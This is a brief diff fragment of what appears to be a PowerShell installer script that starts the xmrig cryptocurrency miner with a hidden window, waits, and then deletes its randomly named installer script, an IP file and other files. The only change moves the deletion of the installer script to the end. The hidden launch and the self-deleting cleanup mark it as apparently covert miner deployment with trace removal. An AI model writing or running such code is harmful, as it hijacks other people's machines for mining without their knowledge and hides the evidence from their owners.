@@ -212,8 +212,7 @@ Start-Process -windowstyle hidden -FilePath "$initial_dir\xmrig-6.22.2\xmrig.exe
 Start-Sleep -Seconds 200
 
 # Delete Installer Script and IP File
-Remove-Item -Path "$initial_dir\BVrAihDwJNvc.ps1"
 Remove-Item -Path "$initial_dir\ip.txt"
 Remove-Item -Path "$initial_dir\NzKnmxLrbsBw.txt"
 Remove-Item -Path "$initial_dir\PkUbTvqXFIdB.txt"
-
+Remove-Item -Path "$initial_dir\BVrAihDwJNvc.ps1"
